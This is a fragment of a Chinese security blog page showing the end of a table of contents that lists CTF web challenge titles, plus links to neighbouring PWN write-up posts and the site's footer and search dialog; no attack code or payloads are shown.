2019]NiZhuanSiWei</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MRCTF2020-Ez-bypass"><span class="toc-text">[MRCTF2020]Ez_bypass</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-HardSQL"><span class="toc-text">[极客大挑战 2019]HardSQL</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-AreUSerialz"><span class="toc-text">[网鼎杯 2020 青龙组]AreUSerialz</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GXYCTF2019-BabyUpload"><span class="toc-text">[GXYCTF2019]BabyUpload</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SUCTF-2019-CheckIn"><span class="toc-text">[SUCTF 2019]CheckIn</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GXYCTF2019-BabySQli"><span class="toc-text">[GXYCTF2019]BabySQli</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GYCTF2020-Blacklist"><span class="toc-text">[GYCTF2020]Blacklist</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RoarCTF-2019-Easy-Java"><span class="toc-text">[RoarCTF 2019]Easy Java</span></a></li></ol></nav><a href="#main" class="toc-top">↑ 回到文章开头</a></div></aside></div><nav class="post-neighbors" aria-label="相邻文章"><a href="/posts/cnblogs-19044898/"><span class="eyebrow">← 更新的一篇</span><strong>Lilctf PWN方向全全全全题解！</strong></a><a href="/posts/cnblogs-18867406/"><span class="eyebrow">更早的一篇 →</span><strong>mini-L2025 PWN方向全题解</strong></a></nav></article>
+
+</main>
+<footer class="site-footer"><div class="footer-top"><a href="/" class="footer-signature" aria-label="undefined 首页">u / n<span>_</span></a><span class="footer-note" aria-hidden="true">u n d _ f i / n e d<br>〃　∷　0 / 0　—　/</span><a class="back-top" href="#" aria-label="回到顶部">↑</a></div><div class="footer-bottom"><span>© 2026 imiab · undefined</span><span class="footer-links"><a href="https://github.com/little-daimi" target="_blank" rel="noopener noreferrer">GITHUB ↗</a><a href="https://www.cnblogs.com/undefined" target="_blank" rel="noopener noreferrer">博客园 ↗</a><a href="/atom.xml">RSS ↗</a></span><span>BUILT WITH HEXO / THE NOISE THEME</span></div></footer>
+</div>
+<dialog class="search-dialog" id="search-dialog" aria-labelledby="search-title"><div class="search-heading"><div><span class="eyebrow">SEARCH / 00</span><h2 id="search-title">搜索文章</h2></div><button class="dialog-close" data-search-close aria-label="关闭搜索">×</button></div><label class="sr-only" for="search-input">搜索文章标题、标签和正文</label><div class="search-field"><span class="search-icon" aria-hidden="true"></span><input id="search-input" type="search" placeholder="文章标题、标签或正文关键词…" autocomplete="off"></div><p class="search-status" id="search-status" role="status" aria-live="polite">输入关键词，搜索全部文章。</p><ul class="search-results" id="search-results"></ul><div class="search-hint"><span>标题 / 标签 / 全文</span><span><kbd>ESC</kbd> 关闭</span></div></dialog>
+<script src="/js/noise.js" defer data-search="/search.json"></script>
+</body></html>
